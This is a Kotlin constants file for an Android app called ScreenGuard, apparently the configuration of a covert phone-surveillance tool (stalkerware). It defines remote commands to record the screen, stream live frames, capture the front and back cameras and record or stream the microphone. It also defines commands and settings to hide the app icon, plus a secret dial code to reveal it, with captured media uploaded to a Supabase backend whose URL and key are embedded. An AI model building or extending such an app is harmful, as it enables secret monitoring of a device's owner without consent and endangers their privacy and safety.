package com.guard.screen.core

object Constants {

    // ============================================
    // ⭐ SUPABASE CONFIG — YAHAN APNI VALUES DAALO
    // ============================================

    // Supabase Dashboard → Settings → API → Project URL
    const val SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co"

    // Supabase Dashboard → Settings → API → anon/public
    const val SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U"

    // ============================================
    // PREFERENCES
    // ============================================

    const val PREFS_NAME = "screenguard_prefs"
    const val KEY_DEVICE_KEY = "device_key"
    const val KEY_SETUP_DONE = "setup_done"
    const val KEY_ICON_HIDDEN = "icon_hidden"
    const val KEY_LAST_SEEN = "last_seen"
    const val KEY_MEDIA_PROJECTION_TOKEN = "media_projection_token"
    const val KEY_TOKEN_TIMESTAMP = "token_timestamp"

    // ============================================
    // NOTIFICATION CHANNELS
    // ============================================

    const val CHANNEL_SERVICE = "screenguard_service"
    const val CHANNEL_RECORDING = "screenguard_recording"
    const val CHANNEL_LIVE = "screenguard_live"

    // ============================================
    // NOTIFICATION IDs
    // ============================================

    const val NOTIF_ID_SERVICE = 1001
    const val NOTIF_ID_RECORDING = 1002
    const val NOTIF_ID_LIVE = 1003
    const val NOTIF_ID_KEEPALIVE = 1004
    const val NOTIF_ID_TOKEN_REFRESH = 1005

    // ============================================
    // SUPABASE TABLES
    // ============================================

    const val TABLE_DEVICES = "devices"
    const val TABLE_COMMANDS = "commands"
    const val TABLE_MEDIA = "media"
    const val TABLE_LIVE_FRAMES = "live_frames"
    const val TABLE_SCHEDULES = "schedules"

    // ============================================
    // SUPABASE STORAGE BUCKETS
    // ============================================

    const val BUCKET_MEDIA = "media"
    const val BUCKET_LIVE_FRAMES = "live-frames"

    // ============================================
    // SUPABASE REALTIME CHANNELS
    // ============================================

    const val REALTIME_COMMANDS = "commands"
    const val REALTIME_DEVICE = "device"

    // ============================================
    // COMMANDS
    // ============================================

    // Screen
    const val CMD_SCREEN_RECORD = "SCREEN_RECORD"    // SCREEN_RECORD:30
    const val CMD_SCREEN_STOP = "SCREEN_STOP"

    // Live
    const val CMD_LIVE_START = "LIVE_START"
    const val CMD_LIVE_STOP = "LIVE_STOP"

    // Camera
    const val CMD_CAM_FRONT = "CAM_FRONT"
    const val CMD_CAM_BACK = "CAM_BACK"

    // Mic
    const val CMD_MIC_RECORD = "MIC_RECORD"          // MIC_RECORD:60
    const val CMD_MIC_LIVE = "MIC_LIVE"
    const val CMD_MIC_STOP = "MIC_STOP"

    // Device
    const val CMD_PING = "PING"
    const val CMD_HIDE = "HIDE"
    const val CMD_SHOW = "SHOW"

    // ============================================
    // COMMAND STATUS
    // ============================================

    const val STATUS_PENDING = "pending"
    const val STATUS_PROCESSING = "processing"
    const val STATUS_DONE = "done"
    const val STATUS_FAILED = "failed"

    // ============================================
    // MEDIA TYPES
    // ============================================

    const val MEDIA_TYPE_PHOTO = "photo"
    const val MEDIA_TYPE_VIDEO = "video"
    const val MEDIA_TYPE_AUDIO = "audio"
    const val MEDIA_TYPE_SCREEN = "screen"

    // ============================================
    // TIMING
    // ============================================

    // Command polling (backup)
    const val COMMAND_POLL_INTERVAL_MS = 5000L

    // Live frame interval
    const val LIVE_FRAME_INTERVAL_MS = 3000L

    // Live audio chunk
    const val LIVE_AUDIO_CHUNK_MS = 5000L

    // Heartbeat
    const val HEARTBEAT_INTERVAL_MIN = 5L

    // Default durations
    const val DEFAULT_SCREEN_DURATION = 30
    const val DEFAULT_MIC_DURATION = 60
    const val MAX_DURATION = 600

    // MediaProjection token valid for 24h on Android 14+
    const val TOKEN_VALIDITY_MS = 23 * 60 * 60 * 1000L  // 23 hours

    // ============================================
    // RETRY
    // ============================================

    const val MAX_UPLOAD_RETRY = 3
    const val UPLOAD_RETRY_DELAY_MS = 5000L

    // ============================================
    // SECRET DIAL CODE
    // ============================================

    const val SECRET_DIAL_CODE = "*#*#6969#*#*"
    const val SECRET_DIAL_HASH = "6969"
}
